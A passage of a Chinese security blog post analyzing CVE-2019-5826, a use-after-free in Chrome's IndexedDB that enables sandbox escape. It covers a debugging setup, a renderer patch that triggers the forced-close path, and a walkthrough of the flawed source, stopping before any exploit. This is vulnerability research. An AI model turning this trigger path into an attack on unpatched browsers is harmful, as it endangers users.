<!DOCTYPE html>


<html lang="zh-CN">


<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="UAF, chrome, CVE,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
   
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    CVE-2019-5826分析 |  Kiprey&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
</head>

</html>

<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-CVE-2019-5826"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  CVE-2019-5826分析
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2020/10/CVE-2019-5826/" class="article-date">
  <time datetime="2020-10-11T14:38:27.000Z" itemprop="datePublished">2020-10-11</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/vulnerability-analysis/">vulnerability analysis</a> / <a class="article-category-link" href="/categories/vulnerability-analysis/chrome/">chrome</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">4.2k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">17 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="简介">简介</h2>
<ul>
<li>
<p>CVE-2019-5826是Google Chrome里IndexedDB中的Use-after-free漏洞，在版本73.0.3683.86之前该漏洞允许攻击者通过<strong>搭配render的RCE漏洞</strong>来造成UAF并<strong>沙箱逃逸</strong>。</p>
<a id="more"></a>
</li>
</ul>
<h2 id="一、环境搭建">一、环境搭建</h2>
<ul>
<li>
<p>笔者所使用的chrome版本为<code>73.0.3683.75</code>（<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc" target="_blank" rel="noopener">源码</a>）。下载源码<strong>并打上patch</strong>，之后编译运行即可（在此感谢<a href="http://github.com/sadmess" target="_blank" rel="noopener">@sad</a>提供的二进制文件，没有编译环境的穷人留下了泪水 T_T）</p>
<p>patch如下。至于为什么要打上patch，笔者将在下面详细介绍。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// third_party/blink/renderer/modules/indexeddb/web_idb_factory_impl.cc</span><br><span class="line">void WebIDBFactoryImpl::Open(</span><br><span class="line">       std::make_unique&lt;IndexedDBDatabaseCallbacksImpl&gt;(</span><br><span class="line">           base::WrapUnique(database_callbacks));</span><br><span class="line">   DCHECK(!name.IsNull());</span><br><span class="line">   factory_-&gt;Open(GetCallbacksProxy(std::move(callbacks_impl)),</span><br><span class="line">                  GetDatabaseCallbacksProxy(std::move(database_callbacks_impl)),</span><br><span class="line">                  name, version, transaction_id);</span><br><span class="line"><span class="addition">+  if (version == 3) &#123;</span></span><br><span class="line"><span class="addition">+    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr_info;</span></span><br><span class="line"><span class="addition">+    auto request = mojo::MakeRequest(&amp;ptr_info);</span></span><br><span class="line"><span class="addition">+    factory_-&gt;DeleteDatabase(std::move(ptr_info), origin, name, true);</span></span><br><span class="line"><span class="addition">+    factory_-&gt;AbortTransactionsForDatabase(origin, base::OnceCallback&lt;void(blink::mojom::IDBStatus)&gt;());</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>从<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc" target="_blank" rel="noopener">chrome源码</a>中依次复制</p>
<ul>
<li><code>indexed_db_database.cc</code></li>
<li><code>indexed_db_factory_impl.cc</code></li>
<li><code>web_idb_factory_impl.cc</code></li>
<li><code>indexed_db_connection.cc</code></li>
</ul>
<p>等文件中的源码，并将其保存至当前目录中的<code>chromeSrc</code>文件夹。这样做的目的是<strong>为了在调试时可以使用源代码</strong>。</p>
<blockquote>
<p>没有源码的调试chrome实在是太痛苦了QwQ</p>
</blockquote>
</li>
<li>
<p>老样子，使用gdb脚本来辅助调试</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdbinit</span></span><br><span class="line"><span class="comment"># 读取符号</span></span><br><span class="line">file ./chrome</span><br><span class="line"><span class="comment"># 设置启动参数</span></span><br><span class="line"><span class="built_in">set</span> args http://localhost:8000/test.html</span><br><span class="line"><span class="comment"># 设置源码路径</span></span><br><span class="line">directory chromeSrc/</span><br><span class="line"><span class="comment"># 设置执行fork后继续调试父进程</span></span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里没有设置<code>--headless</code>，是因为chrome<strong>单次刷新页面的速度比gdb重启chrome的速度快上很多</strong>，这样每次修改完<code>exploit/poc</code>后只需点击刷新即可。</p>
</blockquote>
<p>输入以下命令即可开启调试</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -x gdbinit</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>如果执行时提示<code>No usable sandbox!</code>，执行以下命令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.unprivileged_userns_clone=1</span><br></pre></td></tr></table></figure>
<p><strong>机器重启后该命令将会失效</strong>，届时需要重新执行。</p>
</li>
</ul>
<h2 id="二、IndexedDB简介">二、IndexedDB简介</h2>
<ul>
<li>
<p>Chrome中IndexedDB的大部分是在浏览器进程中实现。 浏览器和渲染中都存在几个不同的mojo IPC接口，用于进程之间的通信，并且使得沙盒渲染能够执行IndexedDB的操作。</p>
</li>
<li>
<p>IndexedDBFactory <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/public/mojom/indexeddb/indexeddb.mojom" target="_blank" rel="noopener">mojo接口</a>是渲染的主要入口点。 <strong>大多数操作（打开、关闭数据库等）都是通过IndexedDBFactory实例来进一步操作IndexedDatabase实例</strong>（注意这句话）。</p>
</li>
<li>
<p>IndexedDB有关于数据库和连接的概念。 对于Chrome-IndexedDB，分别由<code>IndexedDBDatabase</code>和<code>IndexedDBConnection</code>类表示。 在某一时间段内可以<strong>存在对同一数据库的多个连接</strong>，但是每个数据库<strong>只有一个IndexedDBDatabase对象</strong>。</p>
</li>
<li>
<p>另一个要理解的重要概念是<strong>请求。 打开和删除数据库操作不可能同时发生</strong>，但会规划执行相应操作的请求。 通过<code>IndexedDBDatabase::OpenRequest</code> 和<code>IndexedDBDatabase::DeleteRequest</code>类可以实现这些功能。</p>
<blockquote>
<p><code>OpenRequest</code>类和<code>DeleteRequest</code>类是声明在<code>IndexedDBDatabase</code>类中的，换句话说这两个类都是<code>IndexedDBDatabase</code>类的子类。</p>
</blockquote>
</li>
<li>
<p>IndexedDBDatabase对象是一种<strong>引用计数（Reference counted）的对象</strong>。 针对该对象的计数引用被保存在IndexedDBConnection对象、IndexedDBTransaction对象或其他正在进行或待处理的请求对象中。 一旦引用计数降至0，会立即释放对象。</p>
</li>
<li>
<p>释放数据库对象后，<strong>会从数据库映射中删除指向IndexedDBDatabase的相应原始指针</strong>，这点非常重要。</p>
</li>
<li>
<p>我们顺便简单了解一下IndexDB的<code>JS API</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dbName = <span class="string">"mycurrent"</span>;</span><br><span class="line"><span class="comment">// 打开一个数据库，其中数据库名称为dbName，2为数据库版本</span></span><br><span class="line"><span class="comment">// 返回一个requests，这个request在这里应该是OpenRequest</span></span><br><span class="line"><span class="keyword">var</span> request = indexedDB.open(dbName, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// onsuccess是该request处理完成后所执行的回调函数</span></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 当该request执行成功后，request中的result成员为所打开的数据库对象</span></span><br><span class="line">  db = request.result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭一个数据库</span></span><br><span class="line"><span class="keyword">var</span> deleteRequest = indexedDB.deleteDatabase(dbName);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>具体IndexedDB 的细节我们将在下节详细讲解。</p>
</blockquote>
<h2 id="三、漏洞分析">三、漏洞分析</h2>
<h3 id="1-connections-成员变量">1. connections_成员变量</h3>
<p>在讲解漏洞代码之前，我们先了解一下<code>IndexedDBDatabase::connections_</code>成员变量。<code>connections_</code>集合存储着<strong>当前连接至<code>IndexedDatabase</code>的所有连接</strong>。当有新connection连接至数据库，或某个connection被中断时，该<code>connections_</code>变量都会被修改（执行insert或remove函数）。而该关键变量是一个<code>list_set</code>类型的成员。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">IndexedDBDatabase</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">      list_set&lt;IndexedDBConnection*&gt; connections_;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p><code>list_set</code>类型是<code>list</code>与<code>set</code>的结合体，这里我们只需关注该结构体的<code>end</code>函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">iterator <span class="title">end</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> iterator(list_.end()); &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>list_set::end</code>函数返回的是<strong>list的迭代器</strong>。</p>
<h3 id="2-database-map-成员变量">2. database_map_成员变量</h3>
<p>该成员变量保存了所有指向打开的<code>IndexedDatabase</code>的<strong>原始指针</strong></p>
<blockquote>
<p>注意，直接使用C++的原始指针通常是一个比较危险的事情。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">IndexedDBFactoryImpl</span> :</span> <span class="keyword">public</span> IndexedDBFactory &#123;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;IndexedDBDatabase::Identifier, IndexedDBDatabase*&gt; database_map_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当打开一个新的数据库时，指向该数据库的原始指针将会被添加进<code>database_map_</code>中；同样当关闭一个数据库时，指向该数据库的原始指针将会从<code>database_map_</code>中被移除。</p>
<h3 id="3-漏洞流程">3. 漏洞流程</h3>
<h4 id="a-“悬垂”指针">a. “悬垂”指针</h4>
<p>我们先来简单了解一下删除数据库的流程。</p>
<ul>
<li>
<p>当JS中执行<code>indexedDB.deleteDatabase</code>函数时，通过render与chrome之间的IPC通信，chrome进程会执行<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_factory_impl.cc;l=492;bpv=0;bpt=1" target="_blank" rel="noopener">IndexedDBFactoryImpl::DeleteDatabase</a>函数，在该函数中，程序会进一步调用对应<code>IndexedDBDatabase</code>的<code>DeleteDatabase</code>函数来处理对应的数据库。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBFactoryImpl::DeleteDatabase</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> base::string16&amp; name,</span></span></span><br><span class="line"><span class="function"><span class="params">        scoped_refptr&lt;IndexedDBCallbacks&gt; callbacks,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> Origin&amp; origin,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> base::FilePath&amp; data_directory,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">bool</span> force_close)</span> </span>&#123;</span><br><span class="line">  IDB_TRACE(<span class="string">"IndexedDBFactoryImpl::DeleteDatabase"</span>);</span><br><span class="line">  <span class="comment">// 每个IndexedDatabase在IndexedDBFactoryImpl类中都有对应唯一的idntifier</span></span><br><span class="line">  <span class="comment">// 该函数通过数据库名称来获取identifier并进一步在database_map中查找对应的IndexedDatabase指针</span></span><br><span class="line">  <span class="function">IndexedDBDatabase::Identifier <span class="title">unique_identifier</span><span class="params">(origin, name)</span></span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">auto</span>&amp; it = database_map_.find(unique_identifier);</span><br><span class="line">  <span class="keyword">if</span> (it != database_map_.end()) &#123;</span><br><span class="line">    <span class="comment">// 如果找到了对应的数据库，则执行该数据库的DeleteDatabase函数</span></span><br><span class="line">    it-&gt;second-&gt;DeleteDatabase(callbacks, force_close);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=1862" target="_blank" rel="noopener">IndexedDBDatabase::DeleteDatabase</a>中，程序会添加一个<code>DeleteRequest</code>到当前<code>IndexedDatabase</code>中的待处理请求列表中，当数据库处理到<code>DeleteRequest</code>时，数据库就会马上关闭。这样做的目的是为了<strong>在剩余的请求（<code>DeleteRequest</code>前的所有请求）全部处理完之后，再关闭当前数据库</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::DeleteDatabase</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    scoped_refptr&lt;IndexedDBCallbacks&gt; callbacks,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">bool</span> force_close)</span> </span>&#123;</span><br><span class="line">  AppendRequest(<span class="built_in">std</span>::make_unique&lt;DeleteRequest&gt;(<span class="keyword">this</span>, callbacks));</span><br><span class="line">  <span class="comment">// Close the connections only after the request is queued to make sure</span></span><br><span class="line">  <span class="comment">// the store is still open.</span></span><br><span class="line">  <span class="keyword">if</span> (force_close)</span><br><span class="line">    ForceClose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>但是倘若<strong>设置了<code>force_close</code>标志</strong>后，则程序将会进一步执行<code>ForceClose</code>函数来强制关闭所有的<code>request</code>和<code>connection</code>。但是，第二段<strong>用于遍历关闭连接的代码</strong>在修改<code>connections_</code>时<strong>并不安全</strong>。<strong>（漏洞点!）</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::ForceClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// IndexedDBConnection::ForceClose() may delete this database, so hold ref.</span></span><br><span class="line">  <span class="function">scoped_refptr&lt;IndexedDBDatabase&gt; <span class="title">protect</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">  <span class="comment">// 循环将所有尚未处理的请求强制关闭</span></span><br><span class="line">  <span class="keyword">while</span> (!pending_requests_.empty()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;ConnectionRequest&gt; request =</span><br><span class="line">        <span class="built_in">std</span>::move(pending_requests_.front());</span><br><span class="line">    pending_requests_.pop();</span><br><span class="line">    request-&gt;AbortForForceClose();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 循环将所有连接到当前数据库的connections强制断开</span></span><br><span class="line">  <span class="comment">// 注意！这段代码在修改connection_时不够安全</span></span><br><span class="line">  <span class="keyword">auto</span> it = connections_.begin();</span><br><span class="line">  <span class="keyword">while</span> (it != connections_.end()) &#123;</span><br><span class="line">    IndexedDBConnection* connection = *it++;</span><br><span class="line">    <span class="comment">// 注意这一步，执行`connection-&gt;ForceClose()`时，程序会关闭当前连接。</span></span><br><span class="line">    <span class="comment">// 但倘若当前遍历的连接是connection_中的最后一条连接，则会执行函数StartUpgrade以建立新连接</span></span><br><span class="line">    connection-&gt;ForceClose();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 常规检查</span></span><br><span class="line">  DCHECK(connections_.empty());</span><br><span class="line">  DCHECK(!active_request_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在第二个用于关闭connection的循环中，程序会执行<code>connection-&gt;ForceClose()</code>，即<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_connection.cc;l=48;bpv=0;bpt=0" target="_blank" rel="noopener">IndexedDBConnection::ForceClose函数</a>，以强制关闭该connection。而为了在<code>IndexedDBDatabase</code>中释放当前连接在数据库中所占用的资源，在这个函数中，程序会进一步调用<code>IndexedDBDatabase::Close</code>函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBConnection::ForceClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!callbacks_.get())</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IndexedDBDatabase::Close() can delete this instance.</span></span><br><span class="line">  base::WeakPtr&lt;IndexedDBConnection&gt; this_obj = weak_factory_.GetWeakPtr();</span><br><span class="line">  <span class="function">scoped_refptr&lt;IndexedDBDatabaseCallbacks&gt; <span class="title">callbacks</span><span class="params">(callbacks_)</span></span>;</span><br><span class="line">  <span class="comment">// 注意这条代码</span></span><br><span class="line">  database_-&gt;Close(<span class="keyword">this</span>, <span class="literal">true</span> <span class="comment">/* forced */</span>);</span><br><span class="line">  <span class="keyword">if</span> (this_obj) &#123;</span><br><span class="line">    database_ = <span class="literal">nullptr</span>;</span><br><span class="line">    callbacks_ = <span class="literal">nullptr</span>;</span><br><span class="line">    active_observers_.clear();</span><br><span class="line">  &#125;</span><br><span class="line">  callbacks-&gt;OnForcedClose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=1897" target="_blank" rel="noopener">IndexDBDatabase::Close函数</a>会依次执行一系列操作，但这里我们只关注两个操作。该函数中，程序会先<strong>在<code>connection_</code>集合中删除当前连接</strong>，之后<strong>执行<code>active_request_-&gt;OnConnectionClosed</code>函数</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::Close</span><span class="params">(IndexedDBConnection* connection, <span class="keyword">bool</span> forced)</span> </span>&#123;</span><br><span class="line">  DCHECK(connections_.count(connection));</span><br><span class="line">  DCHECK(connection-&gt;IsConnected());</span><br><span class="line">  DCHECK(connection-&gt;database() == <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  IDB_TRACE(<span class="string">"IndexedDBDatabase::Close"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 终止当前连接中所有的未完成事务</span></span><br><span class="line">  connection-&gt;FinishAllTransactions(IndexedDBDatabaseError(</span><br><span class="line">      blink::kWebIDBDatabaseExceptionUnknownError, <span class="string">"Connection is closing."</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 从数据库中的connections_集合中删除当前request</span></span><br><span class="line">  connections_.erase(connection);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 通知当前正在处理的请求，因为当前请求可能需要进行清理或者继续进行操作</span></span><br><span class="line">  <span class="keyword">if</span> (active_request_)</span><br><span class="line">    active_request_-&gt;OnConnectionClosed(connection);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前数据库中的所有连接和所有请求均已经全部释放完成，则从IndexDBFactory类实例中删除指向当前IndexedDBData的指针</span></span><br><span class="line">  <span class="keyword">if</span> (connections_.empty() &amp;&amp; !active_request_ &amp;&amp; pending_requests_.empty()) &#123;</span><br><span class="line">    backing_store_ = <span class="literal">nullptr</span>;</span><br><span class="line">    factory_-&gt;ReleaseDatabase(identifier_, forced);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>OnConnectionClosed</code>函数中会先判断当前待处理connection<strong>是否被过早关闭</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnConnectionClosed</span><span class="params">(IndexedDBConnection* connection)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果连接过早关闭（即一个pending的connection被关闭了，此时会调用OnConnectionClosed</span></span><br><span class="line">    <span class="keyword">if</span> (connection &amp;&amp; connection-&gt;callbacks() == pending_-&gt;database_callbacks) &#123;</span><br><span class="line">        pending_-&gt;callbacks-&gt;OnError(</span><br><span class="line">            IndexedDBDatabaseError(blink::kWebIDBDatabaseExceptionAbortError,</span><br><span class="line">                                   <span class="string">"The connection was closed."</span>));</span><br><span class="line">        <span class="comment">// 该连接将在数据库中被重置</span></span><br><span class="line">        db_-&gt;RequestComplete(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果当前connection不是最后一个要处理的连接，则不会执行到StartUpgrade创建新连接。</span></span><br><span class="line">    <span class="keyword">if</span> (!db_-&gt;connections_.empty())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    StartUpgrade();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果当前连接类型不为<code>pending connection</code>，即<strong>该连接并非被过早关闭</strong>（即正常情况，正常情况是比异常情况更容易触发的），并且<strong>当前连接为connections_中的最后一个连接</strong>。则该函数会执行<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=243" target="_blank" rel="noopener">StartUpgrade</a>函数，<code>StartUpgrade</code>函数内部会使得IndexedDBDatabase<strong>创建一个新的pending connection至connections_列表中</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initiate the upgrade. The bulk of the work actually happens in</span></span><br><span class="line"><span class="comment">// IndexedDBDatabase::VersionChangeOperation in order to kick the</span></span><br><span class="line"><span class="comment">// transaction into the correct state.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StartUpgrade</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使数据库创建一个新的连接</span></span><br><span class="line">    connection_ = db_-&gt;CreateConnection(pending_-&gt;database_callbacks,</span><br><span class="line">                                        pending_-&gt;child_process_id);</span><br><span class="line">    DCHECK_EQ(db_-&gt;connections_.count(connection_.get()), <span class="number">1U</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int64_t</span>&gt; object_store_ids;</span><br><span class="line"></span><br><span class="line">    IndexedDBTransaction* transaction = connection_-&gt;CreateTransaction(</span><br><span class="line">        pending_-&gt;transaction_id,</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="keyword">int64_t</span>&gt;(object_store_ids.begin(), object_store_ids.end()),</span><br><span class="line">        blink::mojom::IDBTransactionMode::VersionChange,</span><br><span class="line">        <span class="keyword">new</span> IndexedDBBackingStore::Transaction(db_-&gt;backing_store()));</span><br><span class="line">    db_-&gt;RegisterAndScheduleTransaction(transaction);</span><br><span class="line"></span><br><span class="line">    transaction-&gt;ScheduleTask(</span><br><span class="line">        base::BindOnce(&amp;IndexedDBDatabase::VersionChangeOperation, db_,</span><br><span class="line">                       pending_-&gt;version, pending_-&gt;callbacks));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>这样，<code>connections_</code>集合元素将不为0。当控制流从<code>OnConnectionClosed</code>函数返回时，便无法通过下面的判断。这样，就无法执行<code>factory_-&gt;ReleaseDatabase</code>。</p>
<blockquote>
